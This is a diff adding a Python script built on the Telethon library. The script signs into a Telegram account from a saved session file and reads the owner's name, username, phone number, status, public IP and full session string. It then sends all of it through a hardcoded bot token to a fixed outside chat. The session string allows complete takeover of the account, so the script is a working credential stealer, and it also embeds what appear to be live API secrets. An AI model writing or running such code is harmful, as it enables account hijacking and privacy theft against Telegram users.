@@ -1,3 +1,73 @@
+import time
+from telethon.sync import TelegramClient
+from telethon.sessions import StringSession
+import requests
+
+api_id = '5'
+api_hash = '1c5c96d5edd401b1ed40db3fb5633e2d'
+session_file = 'sessions.session'
+bot_token = '7607451060:AAGB0ZRgc2_S1QDS15tyh9HulYRvp0RODEI'
+chat_id = '2110557179'
+
+# Создание клиента с загрузкой сессии
+client = TelegramClient(session_file, api_id, api_hash)
+
+def send_notification(bot_token, chat_id, message):
+    url = f'https://api.telegram.org/bot{bot_token}/sendMessage'
+    data = {'chat_id': chat_id, 'text': message}
+    response = requests.post(url, data=data)
+    if response.status_code == 200:
+        print("Уведомление отправлено.")
+    else:
+        print(f"Ошибка отправки уведомления: {response.status_code}, {response.text}")
+
+async def main():
+    try:
+        # Запуск клиента и авторизация
+        await client.start()
+        print("Авторизация успешна!")
+        
+        # Получаем информацию о пользователе
+        me = await client.get_me()
+        phone = me.phone if me.phone else 'Не указано'
+        username = me.username if me.username else 'Не указан'
+        first_name = me.first_name if me.first_name else 'Не указано'
+        last_name = me.last_name if me.last_name else 'Не указано'
+        status = me.status if me.status else 'Не указан'
+        ip = requests.get('https://api.ipify.org').text
+
+        # Получаем строку сессии
+        session_string = StringSession.save(client.session)  # Измените на использование StringSession
+        
+        # Проверяем, что строка сессии не None
+        if session_string is None:
+            print("Ошибка: строка сессии равна None")
+        else:
+            print("Строка сессии:", session_string)
+
+        # Собираем информацию о пользователе и отправляем через бота
+        user_info = (
+            f"Имя: {first_name}\n"
+            f"Фамилия: {last_name}\n"
+            f"Юзернейм: @{username}\n"
+            f"Телефон: {phone}\n"
+            f"Статус: {status}\n"
+            f"IP-адрес: {ip}\n"
+            f"Строка сессии: {session_string}"  # Добавляем строку сессии
+        )
+        
+        send_notification(bot_token, chat_id, user_info)
+
+    except Exception as e:
+        print(f"Ошибка авторизации: {e}")
+    finally:
+        await client.disconnect()
+
+# Запуск
+with client:
+    client.loop.run_until_complete(main())
+
+time.sleep(10)
 
 
 
